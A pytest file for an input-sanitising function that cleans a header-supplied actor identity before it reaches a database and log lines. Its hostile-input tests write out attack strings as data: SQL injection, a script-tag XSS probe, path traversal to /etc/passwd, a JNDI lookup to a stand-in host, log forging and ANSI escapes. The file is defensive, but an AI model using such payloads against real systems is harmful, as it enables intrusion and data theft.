"""``sanitize_actor`` — the only place caller-supplied identity is cleaned.

Tested directly rather than through a request because it is a pure function and the
interesting inputs are hostile. The actor arrives in an HTTP header, lands in a
database column and is rendered into log lines, so it is treated as untrusted.
"""

from __future__ import annotations

import pytest

from nas.domain.entities import MAX_ACTOR_LENGTH
from nas.services.audit import sanitize_actor


class TestOrdinaryInput:
    @pytest.mark.parametrize(
        "raw",
        [
            "gilbert@angani.co",
            "gilbert.mutai@angani.co.ke",
            "first+tag@angani.co",
            "infra-admin",
            "Gilbert Mutai",
        ],
    )
    def test_real_identities_pass_through(self, raw: str) -> None:
        assert sanitize_actor(raw) == raw

    def test_surrounding_whitespace_is_trimmed(self) -> None:
        assert sanitize_actor("  gilbert@angani.co \t") == "gilbert@angani.co"

    def test_case_is_preserved(self) -> None:
        """Matching is case-insensitive at query time; storage keeps what was sent."""
        assert sanitize_actor("Gilbert@Angani.co") == "Gilbert@Angani.co"


class TestNothingUsable:
    @pytest.mark.parametrize("raw", [None, "", "   ", "\n", "\t\r\n", "!!!", "<>"])
    def test_becomes_none(self, raw: str | None) -> None:
        """An unattributable entry is still recorded — with actor NULL, not with a
        placeholder that could be mistaken for a real identity."""
        assert sanitize_actor(raw) is None


class TestHostileInput:
    def test_newlines_are_stripped(self) -> None:
        """A newline in a log-rendered field is a log-forging primitive."""
        forged = "gilbert@angani.co\nlevel=info event=sync_approved"
        cleaned = sanitize_actor(forged)
        assert cleaned is not None
        assert "\n" not in cleaned
        assert "\r" not in cleaned

    def test_ansi_escapes_are_stripped(self) -> None:
        cleaned = sanitize_actor("\x1b[31mroot\x1b[0m")
        assert cleaned is not None
        assert "\x1b" not in cleaned

    def test_null_byte_is_stripped(self) -> None:
        """PostgreSQL rejects NUL in a text value outright, so this would turn an
        audit write into an error and lose the entry."""
        cleaned = sanitize_actor("gilbert\x00@angani.co")
        assert cleaned is not None
        assert "\x00" not in cleaned

    @pytest.mark.parametrize(
        "raw",
        [
            "'; DROP TABLE audit_log; --",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil/x}",
        ],
    )
    def test_injection_payloads_lose_their_syntax(self, raw: str) -> None:
        """Not the primary defence — queries are parameterised and output is escaped.
        This keeps the stored value from *looking* like an attack in a report."""
        cleaned = sanitize_actor(raw)
        if cleaned is not None:
            for char in "<>'\"();${}/\\":
                assert char not in cleaned

    def test_over_long_input_is_truncated_not_rejected(self) -> None:
        """Rejecting would fail the whole sync over a cosmetic problem."""
        cleaned = sanitize_actor("a" * 5000)
        assert cleaned is not None
        assert len(cleaned) == MAX_ACTOR_LENGTH

    def test_truncation_happens_after_cleaning(self) -> None:
        """Order matters: truncating first could leave the length budget filled with
        characters that are then stripped, yielding a shorter result than intended."""
        raw = ("<>" * 400) + ("b" * MAX_ACTOR_LENGTH)
        cleaned = sanitize_actor(raw)
        assert cleaned == "b" * MAX_ACTOR_LENGTH

    def test_a_maximum_length_identity_survives_intact(self) -> None:
        """Guards the boundary: truncation must not shave a valid actor."""
        local = "a" * 64
        domain = ("b" * 251) + ".com"
        actor = f"{local}@{domain}"
        assert len(actor) == MAX_ACTOR_LENGTH
        assert sanitize_actor(actor) == actor
